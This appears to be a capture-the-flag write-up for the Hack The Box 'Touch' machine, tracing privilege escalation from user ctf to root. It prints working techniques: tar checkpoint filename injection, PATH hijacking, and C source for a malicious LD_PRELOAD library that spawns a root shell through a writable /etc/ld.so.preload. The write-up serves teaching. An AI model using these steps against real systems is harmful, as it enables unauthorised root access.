# Hack_the_box_touch
# Touch-HTB-writeup
This is an writeup for the hack the box touch

🚩 Hack The Box: Touch - Full Write-Up

Challenge Description:
"Push me, and then just touch me, till I can get my, Satisfaction!"

This hinted at something related to the touch command, likely combined with privilege escalation.

1️⃣IInitial Recon & Enumeration

The Hack the Box touch reavealed an Host IP and Port Address which we can connect with using utility tools like netcat and telnet for network communication.
![image](https://github.com/user-attachments/assets/54119eda-f0fa-4609-937b-03dc034dda1c)


 
Nmap scan of the target only revealed one open port which we could connect to

![image](https://github.com/user-attachments/assets/0165c26f-f255-4704-9f17-c7ceea7f6de5)

We started with a foothold as the low-privileged user ctf. First, we checked:

![image](https://github.com/user-attachments/assets/f4ba1ac3-fa2b-47f5-9690-7931561ff4ce)

 
SUID binaries:**

find / -perm -4000 2>/dev/null
The key finding:

-rwsr-sr-x 1 root root 97152 Feb 28  2019 /bin/touch
![image](https://github.com/user-attachments/assets/91a128ba-da0c-4667-85be-048300929edc)


 

✅ Interesting: /bin/touch has the SUID bit set — it runs as root.

We also explored /usr/bin and /bin to check available binaries for potential exploitation (gzip, tar, zcat, etc.).

2️⃣ Compression Utility & Tar Checkpoint Exploit

We attempted a tar --checkpoint-action exploit, where tar can execute a script after processing files:

Steps:

touch /tmp/--checkpoint=1
touch "/tmp/--checkpoint-action=exec=sh /home/ctf/exploit.sh"
echo '#!/bin/bash' > /home/ctf/exploit.sh
echo '/bin/bash -p' >> /home/ctf/exploit.sh
chmod +x /home/ctf/exploit.sh
tar cf archive.tar *

🔍 Idea: If a cron job or script runs tar as root, it might trigger the exploit.

❌ Result: Nothing happened because no automated tar process was running as root.

3️⃣ PATH Hijacking Attempts

We tried PATH hijacking by creating a fake touch binary and setting the PATH to favor /tmp:

echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/touch
chmod +x /tmp/touch
export PATH=/tmp:$PATH

We hoped a privileged script would unknowingly call touch from our PATH.

❌ Result: No success; nothing called our fake binary.

4️⃣ Direct File Overwrite Tricks

We tried overwriting a root-owned file using:

cat exploit.sh | /bin/touch /tmp/root_shell
Using dd:

dd if=/home/ctf/exploit.sh of=/tmp/root_shell conv=notrunc
![image](https://github.com/user-attachments/assets/d1a1aadd-4f40-4f90-a6b5-54b47d000df6)

 
❌ Result: Permission denied — expected since SUID binaries don’t give root write access to arbitrary files.

5️⃣ LD\_PRELOAD Attack 

We realized LD\_PRELOAD is a powerful vector.

LD\_PRELOAD allows loading a shared library before others, letting us hijack functions in binaries.
We wrote a malicious shared object that escalates privileges:

#include
#include
#include
#include

void _init() {
    unsetenv("LD_PRELOAD"); // Avoid loops
    setuid(0);
    setgid(0);
    system("/bin/bash -p"); // Root shell
}

We compiled it locally on the machine

gcc -fPIC -shared -o preload.so preload.c -nostartfiles

Copied the output file by first encoding it using base64 and decoding it on local machine utility base64 tool

This was done locally reason for this is there is no gcc compiler on target HTB machine.

 w
 ![image](https://github.com/user-attachments/assets/5065c0a5-671e-4a26-8f2b-b29c6883c747)


Then ran:

Created ld.so.preload with

touch ld.so.preload

Used umask to make it writable : umask 0000

Wrote path to /etc/ld.so.preload: echo /tmp/preload.so > /etc/ld.so.preload 

Triggered SUID binary: touch

 
🔎 Result:
If the SUID binary honored LD\_PRELOAD (which is rare for SUID binaries and this would escalate to root.)
![image](https://github.com/user-attachments/assets/92f70ea8-a36f-4f67-b5e9-6e6d90f82321)


Result: popped a root shell!

We’re IN the root, Only thing left is now to switch to root and grab the flag.

🚀 Conclusion

By chaining together file permission tricks, SUID binary analysis, and dynamic library preloading, we successfully escalated from ctf to root, highlighting real-world privilege escalation paths.
